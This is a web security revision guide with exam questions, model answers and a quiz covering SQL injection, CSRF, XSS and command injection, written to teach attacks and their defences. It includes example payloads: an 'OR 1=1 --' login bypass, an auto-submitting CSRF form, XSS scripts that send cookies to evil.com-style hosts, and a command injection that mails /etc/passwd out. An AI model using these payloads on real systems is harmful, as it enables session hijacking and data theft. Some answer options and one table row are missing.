📋 Overview: Web Applications & Attack Surface

What is a Web Application?

An application stored on a remote server, delivered over the internet through a browser interface. Examples: online banking, email, social media.

HTTP vs HTTPS

HTTP — plain text, vulnerable to sniffing. HTTPS = HTTP + TLS encryption. SSL is deprecated; TLS is the current standard.

The 3 Main Threats

SQL Injection · CSRF · XSS

All exploit trust relationships between user, browser, and server.

🌐 HTTP, HTTPS & Session Management

FTP — Insecure

File Transfer Protocol. Transmits everything in cleartext: usernames, passwords, data. Vulnerable to sniffing attacks.

HTTP

Carrier protocol for HTML, CSS, images. No encryption. All data visible on network.

http://moodle.gla.ac.uk/course/view.php?id=343

HTTPS

HTTP + TLS encryption. SSL deprecated. Browser shows 🔒 lock icon. Prevents eavesdropping and man-in-the-middle attacks.

Sessions & Cookies

HTTP is stateless — the server doesn't remember you between requests. Sessions solve this.

User logs in → server authenticates credentials
Server generates a random session ID (a large random number)
Session ID stored in a cookie in the browser
Browser sends cookie with every subsequent request
Server looks up session ID in its cache → knows who you are
URL Session IDs (vulnerable approach): Some sites embed session IDs directly in the URL: http://example.com/account?sessionid=abc123xyz This is dangerous: IDs can leak via browser history, referer headers, server logs, and shared links.
Secure session best practices: Use HttpOnly + Secure cookie flags · Session timeout after inactivity · Regenerate session ID after login · Use HTTPS only

How it Works — The Classic Login Bypass

Normal Query

-- User enters: username = "alice", password = "secret"
SELECT * FROM Users WHERE user='alice' AND pwd='secret'
-- Returns: alice's row → login succeeds

SQL Injection Attack

-- Attacker enters username = "' or 1=1 --"
-- After substitution:
SELECT * FROM Users WHERE user='' or 1=1 --' AND pwd='anything'
--                              ^^^^^^^^              ^^^^^^^^^^^^^^^^^^
--                         ALWAYS TRUE              commented out!
-- Result: returns ALL rows → login always succeeds!
Why does this work? The ' closes the string literal. OR 1=1 makes the condition always true. -- comments out the rest, removing the password check.

PHP Vulnerable Code vs Secure Code

❌ Vulnerable PHP
✅ Secure PHP (Prepared Statements)
✅ ORM Approach
// VULNERABLE: direct string concatenation
$username = $_POST['username'];
$password = $_POST['password'];

$sql = "SELECT * FROM Users WHERE user='$username' AND pwd='$password'";
$result = $db->executeQuery($sql);
// If $username = "' or 1=1 --" → authentication bypass!
// SECURE: Parameterized / Prepared Statements
$username = $_POST['username'];
$password = $_POST['password'];

// ? placeholders — value NEVER interpreted as SQL code
$stmt = $pdo->prepare("SELECT * FROM Users WHERE user=? AND pwd=?");
$stmt->execute([$username, $password]);
$result = $stmt->fetchAll();
// Even "' or 1=1 --" is treated as a literal string, not SQL!
// ORM (e.g., Eloquent/Laravel) — never write raw SQL
// High-level object code → ORM generates safe parameterised SQL
$user = User::where('username', $username)
           ->where('password', hash($password))
           ->first();
// ORM = abstraction layer; no raw SQL = no injection surface

Command Injection (Related Attack)

// Vulnerable PHP using system()
$email = $_POST['email'];
$subject = $_POST['subject'];
system("mail $email -s $subject < /tmp/joinmynetwork");

// Normal: email=alice@example.com, subject=hello
// Malicious: email=hacker@x.net & subject=foo < /usr/passwd; ls
// Executed: mail hacker@x.net -s foo < /usr/passwd; ls
// Result: /etc/passwd sent to attacker! Then 'ls' runs!
Real-world example — CardSystems (2005): SQL injection attack against a credit card payment processor. 263,000 card numbers stolen, 43 million exposed. Company was put out of business. All data stored unencrypted.

🎭 Cross-Site Request Forgery (CSRF)

Core idea: The attacker tricks a logged-in user's browser into sending a request to a legitimate site — using the user's own session cookie — without the user's knowledge. Also called session riding or one-click attack.

Attack Flow — Step by Step

User logs into www.good-banking-site.com. Server issues an authentication cookie.
User visits www.evil-crook-site.com (maybe from a phishing link).
Evil site contains a hidden HTML form with action="www.good-banking-site.com/transfer".
Form auto-submits via JavaScript, sending a transfer $1000 to attacker request.
Browser automatically attaches the banking site cookie — server thinks it's the real user!
Bank executes the transfer. User never knew.

CSRF Attack — The Evil Form

✅ Legitimate Bank Site
<!-- Legit form -->
<form action="/transfer">
  To: <input name="to">
  Amount: <input name="amount">
  <button>Submit</button>
</form>
❌ Evil Attacker Site
<!-- Hidden CSRF form -->
<form id="csrf"
  action="https://bank.com/transfer"
  method="POST" hidden>
  <input name="to" value="attacker">
  <input name="amount" value="1000">
</form>
<script>
  document.getElementById('csrf').submit();
</script>

Why Browsers Enable This

Web browsers automatically attach cookies when making requests to a domain. This is by design (for usability). CSRF exploits this expected behaviour — the bank's server sees valid session cookie and trusts the request.

CSRF Defences

CSRF Token (Best Defence)

Server generates a unique random token per session. Token embedded in every form. Server validates token on submission. Attacker cannot forge it (they can't read the victim's page).

<input type="hidden" name="csrf_token"
  value="xK9mN2pQ7rL4sT1wV8yB3cE6hJ5aD0fG">

SameSite Cookie Attribute

Browser only sends cookie if request originates from same site. Prevents cross-site cookie sending at the browser level.

Set-Cookie: session=abc123;
  SameSite=Strict; Secure; HttpOnly

Additional Defences

  • Use HTTPS throughout
  • Check Referer/Origin header
  • Re-authenticate for sensitive actions
  • Don't use GET for state-changing actions

⚡ Cross-Site Scripting (XSS)

Core idea: Attacker injects malicious JavaScript into a trusted website. The victim's browser executes that script — trusting it because it appears to come from a legitimate site.

Two Types of XSS

Type 1: Reflected XSS

Malicious script is in the URL. Server reflects it back in the response. User clicks a crafted link → script executes. Not stored — only activates when victim clicks the link.

Attacker crafts URL → Victim clicks → Server echoes script back → Victim's browser executes it

Type 2: Stored XSS (Persistent)

Malicious script is stored in the server's database (e.g., in a comment field). Every user who views the page gets the script executed. More dangerous — affects all visitors.

Attacker injects script → Stored in DB → Any user views page → Script executes

Reflected XSS Example

// Vulnerable search page echoes back the query:
// URL: https://example.com/search?q=<script>alert('XSS')</script>

// Server-side PHP (vulnerable):
echo "You searched for: " . $_GET['q'];
// Renders: You searched for: <script>alert('XSS')</script>
// Browser executes the script!

// Realistic malicious payload — steal cookie:
// q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
// This sends victim's session cookie to the attacker!

Stored XSS Example

// Forum/comment system allows HTML (vulnerable):
// Attacker posts comment:
"Great post! <script>
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: document.cookie
  });
</script>"

// Comment stored in database
// Every user who views the page → their cookie is stolen!

XSS vs SQL Injection — Know the Difference!

SQL Injection

Injects SQL commands into a database query. Runs on the server. Can bypass login, dump entire database, modify/delete records. Targets the data tier.

Stored XSS

Injects JavaScript code stored on the server. Runs on the client browser. Can steal session cookies, redirect users, deface pages, perform phishing. Targets all users.

XSS Defences

Output Encoding (Best)

Encode special HTML chars before rendering: <→&lt;, >→&gt;. Browser displays text, doesn't execute it.

// PHP: htmlspecialchars()
echo htmlspecialchars($_GET['q']);
// <script> becomes &lt;script&gt;

Content Security Policy (CSP)

HTTP header that restricts where scripts can come from. Inline scripts blocked by default. Powerful defence-in-depth.

Content-Security-Policy:
  script-src 'self' https://cdn.example.com;

Other Defences

  • Input validation / sanitisation
  • HttpOnly cookies (script can't read)
  • Proxy-based HTTP traffic analysis
  • Application-level firewall
  • Auditing system for JS execution

Email Security — Phishing Detection

What to Check in a Suspicious Email

  • Sender email address (does domain match?)
  • Grammar mistakes, unusual language, urgency
  • Unexpected requests (login, payment, personal info)
  • Suspicious attachments claiming to be encrypted PDFs
  • Links — hover to see actual URL, check for http:// vs https://

Forensic Investigation of Email

  1. Sender IP address — from email headers
  2. Sender domain — trace via ipvoid or similar OSINT tool
  3. Attachment analysis — check if malicious (malware scanner, sandboxing)

Good Practice Response

  • Do NOT click links or open attachments
  • Report to information security team
  • Warn colleagues to be aware
  • Forward to IT/Security for investigation

Q1 5 marks

A company called Travelsafe operates through a website that uses URL session IDs (unique numbers assigned by a website server to a user for a specific session after the user's account has been authenticated). This website serves as an exploratory environment where visitors are provided with a search box to identify possible holiday locations.

Mention and describe a potential vulnerability and the corresponding defence mechanisms that can be employed to mitigate it.

Model Answer — 5 marks

Vulnerability 1 — XSS via Search Box 2 marks

The search box accepts user input which is likely reflected back in the page (e.g., "Showing results for: [input]"). An attacker can inject a malicious script: <script>document.location='evil.com/steal?c='+document.cookie</script>. If URL session IDs are used, the session ID may be in the URL and accessible via document.location or passed in the referer header to external sites.

Vulnerability 2 — Session Hijacking via URL Session ID 1 mark

Since the session ID is in the URL (e.g., travelsafe.com/search?session=abc123&q=Paris), it can be leaked through: browser history, server access logs, referer headers when clicking external links, or shoulder surfing. Attacker who obtains the session ID can impersonate the user.

Defence Mechanisms 2 marks

  • Output encoding: encode all search input before rendering (htmlspecialchars) → prevents XSS
  • Move session ID to cookie: use HttpOnly + Secure cookie flags instead of URL parameters
  • CSRF token: unique per session, validated server-side
  • HTTPS: encrypts session ID in transit
  • Session timeout: short-lived session IDs reduce hijack window
Examiner's note: Full marks for identifying XSS as the vulnerability (given the search box) + URL session ID leakage. Must include defences for both. Mentioning SQL injection also valid if search box is DB-backed.
Q2 7 marks

Some companies, including Google and Amazon, use Single Sign-On (SSO) for user authentication, which enhances security.

(1) Argue for the advantages and disadvantages of using SSO over traditional approaches. 4 marks

(2) Explain what SSO means for: Confidentiality, Integrity, Authenticity, Accountability, and Non-repudiation. 3 marks

Model Answer

Part 1 — Advantages of SSO

  • Usability: one set of credentials for multiple services → fewer passwords to remember → users less likely to reuse weak passwords
  • Reduced attack surface: fewer password databases to protect; single point of hardening
  • Centralised security policy: enforce MFA, password complexity from one place
  • Faster revocation: disable one account → access to all services immediately revoked

Part 1 — Disadvantages of SSO

  • Single point of failure: if SSO server is down, no access to any service
  • Single point of compromise: if attacker gets SSO credentials, they access everything
  • Privacy: identity provider can track which services you use
  • Complexity: implementation is complex; misconfiguration is dangerous

Part 2 — CIA + AN Properties

PropertySSO Impact
ConfidentialitySingle credential protects all services; if credentials compromised, all services exposed. Use MFA to strengthen.
IntegrityCentralised auth token ensures only authenticated users modify data; token tampering detected by signature.
AuthenticityStrong authentication at SSO point confirms identity; all downstream services trust the SSO assertion.
AccountabilityAll actions tied to single identity → comprehensive audit log across all services.
Non-repudiationSingle authenticated session creates clear evidence of who performed which action — harder to deny.

Extra Q1 8 marks

A social media platform allows users to post comments. An attacker discovers the platform does not sanitise HTML in comment fields.

(a) Name the type of attack possible and explain why it is particularly dangerous here compared to reflected XSS. [4 marks]

(b) Write pseudocode or example payload showing how the attacker steals session cookies. [2 marks]

(c) Describe two specific defence mechanisms. [2 marks]

Solution

(a) Stored (Persistent) XSS — Dangerous because: the script is stored in the server's database permanently. Every user who views the affected page executes the malicious code, not just the one who clicks a crafted link. Scale: 1 attack affects thousands of users. Reflected XSS requires each victim to click a malicious link.

(b) Payload:

// Attacker posts this as a "comment":
<script>
  fetch('https://evil-attacker.com/steal?cookie='
    + encodeURIComponent(document.cookie));
</script>
// document.cookie contains the session ID
// Attacker uses stolen session ID to impersonate victim

(c) Defences:

  • Output encoding: use htmlspecialchars() — converts <script> to harmless text &lt;script&gt;
  • HttpOnly cookie flag: session cookie marked HttpOnly cannot be accessed by JavaScript (document.cookie returns empty)
Extra Q2 6 marks

An online forum has the following PHP login code:

$user = $_POST['username'];
$pass = $_POST['password'];
$sql = "SELECT * FROM users WHERE username='$user' AND password='$pass'";

(a) What attack is possible and what would an attacker enter to bypass authentication? [3 marks]

(b) Rewrite the code securely using parameterised queries. [2 marks]

(c) What additional change should be made to the stored password? [1 mark]

Solution

(a) SQL Injection. Attacker enters username: ' OR 1=1 -- (any password). Resulting query:

SELECT * FROM users WHERE username='' OR 1=1 --' AND password='x'
-- OR 1=1 is always true; -- comments out the password check
-- Returns all users; application logs in as first/admin user

(b) Secure rewrite:

$stmt = $pdo->prepare("SELECT * FROM users WHERE username=? AND password=?");
$stmt->execute([$user, hash('sha256', $pass)]);

(c) Passwords should be stored as salted hashes (bcrypt or Argon2), not plaintext or simple SHA-256. A salt is a random value added before hashing to prevent rainbow table attacks.

Extra Q3 7 marks

Compare and contrast SQL Injection, CSRF, and XSS attacks. For each: state what it targets, how it works, and one specific defence. Present your answer in a structured format. [7 marks]

Solution

AttackTargetsMechanismDefence
SQL Injection Server-side database Malicious SQL embedded in user input; changes meaning of DB query; can bypass auth, dump/modify data Prepared statements / parameterised queries
CSRF Victim server (via victim's authenticated browser) Attacker tricks victim's browser into sending authenticated request to legitimate server; browser auto-sends session cookies CSRF token (unique secret per session, validated server-side)

Extra Q4 5 marks

Explain the difference between Reflected XSS and Stored XSS. In each case, describe: (1) how the attack is delivered, (2) who is affected, and (3) give a realistic scenario. [5 marks]

Solution

Reflected XSS

Delivery: Attacker sends victim a crafted URL containing the script (e.g., via phishing email). Script is reflected back in the server's response.

Affected: Only users who click the specific malicious link.

Scenario: Search engine echoes query in page. Attacker emails link: shop.com/search?q=<script>...</script>. Victim clicks, their session cookie stolen.

Stored XSS

Delivery: Attacker posts malicious script in a form field (comment, profile, message) that is stored in the database and rendered to all users.

Affected: All users who view the affected page — potentially thousands.

Scenario: Attacker posts a comment containing <script>...steal cookie...</script> on a popular news site. Every reader of that article has their session hijacked.

Extra Q5 6 marks

A healthcare website uses session IDs stored as URL parameters. Explain three distinct risks this creates and propose three specific mitigations. [6 marks]

Solution

Risks:

  1. Referer header leakage: When user clicks an external link from a page with a session ID URL, the full URL (including session ID) is sent in the HTTP Referer header to the external server.
  2. Browser history / bookmarks: Session ID stored permanently in browser history; if device is shared or stolen, attacker can replay the session.
  3. Server access logs: Session IDs appear in server logs in plaintext; any log access by an insider or attacker reveals active sessions.

Mitigations:

  1. Move session IDs to HttpOnly + Secure cookies — not visible in URL, not accessible via JS, only sent over HTTPS.
  2. Implement session timeouts — short expiry minimises window of exploitation even if ID is leaked.
  3. Use HTTPS exclusively and include Referrer-Policy: no-referrer header to prevent URL leakage to external sites.
Extra Q6 5 marks

The following PHP code is used on a web server:

$email = $_POST['email'];
$subject = $_POST['subject'];
system("mail $email -s $subject < /tmp/joinmynetwork");

(a) What type of attack does this enable? [1 mark]

(b) Show an example of a malicious input that would exfiltrate the server's password file. [2 marks]

(c) Describe two ways to prevent this attack. [2 marks]

Solution

(a) Command Injection (also known as OS Command Injection) — user input is unsafely passed to a system shell command.

(b) Malicious input:

email = hacker@evil.com
subject = foo < /etc/passwd; ls
-- Resulting command:
mail hacker@evil.com -s foo < /etc/passwd; ls
-- /etc/passwd contents emailed to attacker, then ls executes

(c) Prevention:

  • Input validation/sanitisation: whitelist only alphanumeric characters and @/. for email; reject semicolons, pipes, redirects
  • Avoid system() with user input: use a proper mail library (PHPMailer, SwiftMailer) that doesn't invoke shell; never pass user data directly to shell functions

🧠 10-Question Practice Quiz

1. Which attack inserts malicious SQL into user input to manipulate a database query?
Answer: B — SQL Injection. The attacker embeds SQL syntax (e.g., ' OR 1=1 --) into input fields. The server builds a SQL query by concatenating this input, altering the query's logic. XSS targets the browser; CSRF forges requests; Command Injection targets OS shell.
2. What is the BEST defence against SQL injection?
Answer: C — Prepared Statements. With parameterised queries, user input is passed as data, never interpreted as SQL. Length limits are trivially bypassed. HTTPS doesn't affect server-side SQL. JS has nothing to do with SQL injection.
3. A CSRF attack works by:
Answer: B. CSRF exploits the fact that browsers automatically attach session cookies to requests. The attacker's evil site makes the victim's browser send a forged request. The server sees a valid cookie and executes the action.
4. Stored XSS is more dangerous than Reflected XSS because:
Answer: B. Stored XSS persists in the database. Any user who loads the page executes the script — no crafted link needed. Reflected XSS only triggers when a victim clicks a specific malicious URL.
5. Which defence specifically prevents a CSRF token attack?
Answer: C — CSRF token. A unique, random token embedded in each form. The attacker's site cannot read this token (same-origin policy). Server validates token on submission — forged requests without the token are rejected.
6. The -- in ' OR 1=1 -- SQL injection payload does what?
Answer: B. In SQL, -- begins a line comment. Everything after -- (including AND password='...') is ignored by the database engine. This neutralises the password check.
7. An HttpOnly cookie flag means:
Answer: B. HttpOnly is a security flag that prevents JavaScript from accessing the cookie via document.cookie. This stops XSS attacks from stealing session cookies. "Secure" flag (separate) ensures cookie is only sent over HTTPS.
8. URL session IDs are a security risk mainly because:
Answer: B. Even over HTTPS, URL parameters are stored in browser history, bookmarks, server access logs, and sent in the HTTP Referer header to external sites. This exposes session IDs to more parties than cookie-based sessions.
9. The CardSystems SQL injection attack (2005) resulted in:
Answer: C. CardSystems was a credit card payment processor. June 2005 SQL injection: 263,000 card numbers stolen, 43 million exposed. Data was stored unencrypted. The company was subsequently put out of business — a powerful real-world example of the consequences of SQL injection.
10. HTTPS provides security over HTTP by:
Answer: B. HTTPS = HTTP + TLS. TLS (Transport Layer Security) encrypts the HTTP traffic, preventing eavesdropping, man-in-the-middle attacks, and tampering. SSL is the deprecated predecessor — TLS is now standard. Running on port 443 vs 80 is just convention, not a security mechanism.
